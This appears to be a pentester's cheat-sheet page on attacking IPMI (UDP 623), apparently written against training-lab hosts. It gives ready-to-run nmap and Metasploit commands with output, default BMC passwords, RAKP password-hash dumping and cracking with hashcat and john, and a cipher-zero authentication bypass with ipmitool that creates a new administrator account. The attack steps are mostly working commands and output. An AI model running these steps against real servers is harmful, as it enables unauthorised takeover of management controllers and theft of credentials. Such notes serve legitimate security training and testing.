---
public: true 
#Tags: tag1, tag2
---
Port : 623/udp

## Enumeration

### nmap

```shell-session
$ sudo nmap -sU --script ipmi-version -p 623 $TARGET_IP
```

### metasploit

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Default passwords

| Product | Username | Password|
| --- | --- | --- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8 characters (number and uppercase letters) |
| Supermicro IPMI | ADMIN | ADMIN |


## IPMI 2.0 Password Hash grabbing
Any valid username can lead to grabbing from the server the salted SHA1 or MD5 password of that user. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.

It can then be cracked offline using `hashcat` with `mode 7300`

### Getting the Hash using Metasploit
[IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Cracking the hash
```
$ john -w=/usr/share/wordlists/rockyou.txt ipmi.john 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trinity          (10.129.190.51 admin)      <====================================== 
1g 0:00:00:03 DONE (2023-04-27 19:03) 0.2538g/s 3640Kp/s 3673Kc/s 3673KC/s -xlengx-..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

### Authenticating without password
If you know a valid username, you might authenticate without password

#### Check if host is vulnerable

```
 sudo nmap -n -Pn -sU -T5 $TARGET_IP -p 623 --script ipmi-cipher-zero           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:08 BST
Nmap scan report for 10.129.181.223
Host is up (0.023s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-cipher-zero: 
|   VULNERABLE:
|   IPMI 2.0 RAKP Cipher Zero Authentication Bypass
|     State: VULNERABLE
|     Risk factor: High
|       

```

#### Exploitation

```
$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user list          
IANA PEN registry open failed: Aucun fichier ou dossier de ce type
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
1                    true    false      false      USER
2   ceil             true    false      true       ADMINISTRATOR
3                    true    false      false      Unknown (0x00)
4                    true    false      false      Unknown (0x00)
[...]
```

Creation of a new administrator user with known password
```
$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set name 4 rebrec 
$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set password 4 rebrec
$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set priv 4 4
```
We can then try to connect through the web interface and interact with the console